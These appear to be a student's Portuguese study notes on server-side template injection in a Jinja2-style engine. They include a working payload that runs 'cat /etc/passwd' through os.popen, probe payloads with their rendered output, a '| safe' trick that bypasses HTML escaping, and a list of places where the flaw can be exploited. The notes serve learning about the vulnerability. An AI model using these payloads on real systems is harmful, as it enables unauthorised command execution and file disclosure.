{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
	saída esperada conforme subject

{{ [].__class__ }} → <class 'list'>
	retorna: Hello, { &lt;class &#39;list&#39;&gt; → <class 'list'> }!
	indica que o template está escapando os caracteres especiais de HTML
para corrigir isso podemos forçar a renderização com:
{{ [].__class__ | safe }}
	retorna: Hello, { <class 'list'> }!

{{ 'A' * 10 }}
	retorna: Hello, { AAAAAAAAAA }!

Onde essa vulnerabilidade pode ser explorada:
- Dados vindos de banco de dados: Mesmo que o input original tenha sido feito em outro momento, se o conteúdo do banco for renderizado com {{ }} sem escape, você ainda pode executar código mais tarde (SSTI armazenado).
- E-mails ou mensagens geradas por templates: Alguns sistemas geram e-mails usando templates preenchidos por dados do usuário. Se o nome do usuário é inserido em um template de e-mail sem limpeza, pode permitir execução.
- URLs com parâmetros visíveis no template: Se o backend renderiza user dentro de um template, a execução pode acontecer.